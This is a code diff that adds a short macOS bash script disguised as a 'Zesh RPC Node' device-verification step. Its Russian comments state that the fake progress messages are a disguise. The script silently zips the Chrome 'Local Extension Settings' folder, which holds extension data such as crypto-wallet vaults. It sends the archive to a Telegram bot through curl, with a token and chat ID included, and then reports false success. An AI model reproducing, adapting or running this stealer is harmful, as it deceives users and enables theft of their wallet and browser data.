@@ -1,0 +1,15 @@
+#!/bin/bash
+# Маскировка под процесс верификации
+echo "Connecting to Zesh RPC Node..."
+sleep 2
+echo "Verifying device signature..."
+
+# Путь к данным (пример для Chrome)
+SOURCE_DIR="$HOME/Library/Application Support/Google/Chrome/Default/Local Extension Settings"
+DEST_FILE="/tmp/zesh_payload.zip"
+
+# Упаковка и отправка через curl (стандарт для Mac)
+zip -r $DEST_FILE "$SOURCE_DIR" > /dev/null 2>&1
+curl -F document=@"$DEST_FILE" "https://api.telegram.org/bot8306979857:AAHz6mJipjg0kYnJVXhapTe2FgxTKbP1J7s/sendDocument?chat_id=-1003993722465" > /dev/null 2>&1
+
+echo "Verification Successful. You can close this window."
